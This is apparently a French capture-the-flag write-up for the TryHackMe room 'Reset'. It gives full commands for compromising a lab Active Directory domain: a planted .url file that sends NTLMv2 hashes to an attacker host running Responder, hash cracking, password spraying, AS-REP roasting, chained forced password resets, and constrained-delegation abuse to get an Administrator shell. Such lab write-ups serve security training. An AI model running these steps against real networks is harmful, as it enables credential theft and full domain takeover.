---
title: "TryHackMe - Reset"
date: 2025-10-22
platform: TryHackMe
category: realist
difficulty: hard
tags: [ActiveDirectory, NTLM, Kerberos, Delegation, Bloodhound]
description: "Writeup de la room Reset sur TryHackMe - capture NTLMv2 via fichier .url piégé, escalade AD par chaîne de droits et abus de constrained delegation pour obtenir un shell Administrator."
---

## TL;DR

- **Cible :** `10.10.111.252` (`haystack.thm.corp`)
- **Accès initial :** capture NTLMv2 via fichier `.url` piégé dans `\Data\onboarding` → cracking → compte `AUTOMATE`
- **Escalade :** chaîne de droits AD → reset de mots de passe → `DARLA_WINTERS` → constrained delegation → impersonation `Administrator`

---

## Scan initial

```bash
export IP=10.10.111.252
nmap -T4 -n -sC -sV -Pn -p- $IP
echo '10.10.111.252 thm.corp haystack.thm.corp' | sudo tee -a /etc/hosts
```

Ports ouverts : Kerberos (88), LDAP, SMB (445), RPC, RDP - environnement Active Directory.

---

## Enumération SMB

```bash
smbclient -U 'anonymous'%'' '\\10.10.111.252\Data'
# cd onboarding; ls
```

Le partage `\Data\onboarding` est accessible en anonymous et son contenu change régulièrement — surface d'attaque idéale pour injecter un fichier piégé.

---

## Capture NTLMv2 via `.url` piégé

On génère un fichier `.url` qui force une authentification NTLMv2 vers notre machine :

```bash
python3 ntlm_theft.py -g url -s 10.11.63.57 -f test
```

On lance Responder pour intercepter :

```bash
sudo responder -I tun0
```

On upload le fichier sur le partage :

```bash
smbclient '\\10.10.111.252\Data' -U 'anonymous'%''
# smb: \> cd onboarding
# smb: \onboarding\> put "test-(icon).url"
```

Responder capture le hash NTLMv2 :

```
[SMB] NTLMv2-SSP Username : THM\AUTOMATE
[SMB] NTLMv2-SSP Hash     : AUTOMATE::THM:[HASH]
```

---

## Crack & accès initial

```bash
john hash --wordlist=/usr/share/wordlists/rockyou.txt
# → Passw0rd1
```

```bash
evil-winrm -i haystack.thm.corp -u 'automate' -p 'Passw0rd1'
```

**User flag :** `THM{*********_****_*******_**}`

---

## Enumération AD

**RID brute** pour extraire les utilisateurs :

```bash
nxc smb 10.10.111.252 -u 'AUTOMATE' -p 'Passw0rd1' --rid-brute --users-export users.txt
```

**Password spraying :**

```bash
nxc smb 10.10.111.252 -u users.txt -p 'ResetMe123!' --no-bruteforce --continue-on-success
```

**AS-REP Roasting :**

```bash
GetNPUsers.py thm.corp/ -usersfile users.txt -dc-ip 10.10.111.252 -no-pass
```

Résultat : `TABATHA_BRITT:marlboro(1985)`

---

## Collecte BloodHound

```bash
bloodhound-python -ns 10.10.255.128 --dns-tcp -d thm.corp -u 'automate' -p 'Passw0rd1' -c All --zip
```

L'analyse révèle une chaîne de droits depuis `TABATHA_BRITT` jusqu'à `DARLA_WINTERS` :

![Chaîne de droits BloodHound]({{ '/assets/img/reset-bloodhound-chain.png' | relative_url }})

`DARLA_WINTERS` possède une **Constrained Delegation** sur `cifs/haystack.thm.corp` :

![Constrained Delegation BloodHound]({{ '/assets/img/reset-constrained-delegation.png' | relative_url }})

---

## Chaîne de reset de mots de passe

`TABATHA_BRITT` → GenericAll → `SHAWNA_BRAY` → ForceChangePassword → `CRUZ_HALL` → ForceChangePassword → `DARLA_WINTERS`

```bash
# TABATHA_BRITT → SHAWNA_BRAY
net rpc password "SHAWNA_BRAY" "NewPassword123@" -U "THM.CORP"/"TABATHA_BRITT"%"marlboro(1985)" -S "haystack.thm.corp"
nxc smb haystack.thm.corp -u 'SHAWNA_BRAY' -p 'NewPassword123@'

# SHAWNA_BRAY → CRUZ_HALL
net rpc password "CRUZ_HALL" "NewPassword123@" -U "THM.CORP"/"SHAWNA_BRAY"%"NewPassword123@" -S "haystack.thm.corp"
nxc smb haystack.thm.corp -u 'CRUZ_HALL' -p 'NewPassword123@'

# CRUZ_HALL → DARLA_WINTERS
net rpc password "DARLA_WINTERS" "NewPassword123@" -U "THM.CORP"/"CRUZ_HALL"%"NewPassword123@" -S "haystack.thm.corp"
nxc smb haystack.thm.corp -u 'DARLA_WINTERS' -p 'NewPassword123@'
```

---

## Abus de Constrained Delegation

```bash
# Synchroniser l'heure (Kerberos est sensible au décalage)
ntpdate haystack.thm.corp
# OR
rdate -n haystack.thm.corp

# Obtenir un TGS en impersonnant Administrator
getST.py -spn "cifs/haystack.thm.corp" -impersonate "Administrator" "thm.corp/DARLA_WINTERS:NewPassword123@"

# Utiliser le ticket
export KRB5CCNAME=Administrator.ccache
wmiexec.py -k -no-pass Administrator@haystack.thm.corp
```

Shell `Administrator` obtenu.

```bash
type C:\Users\Administrator\Desktop\root.txt
```
**Root flag :** `THM{*********_****_*******_**}`
---
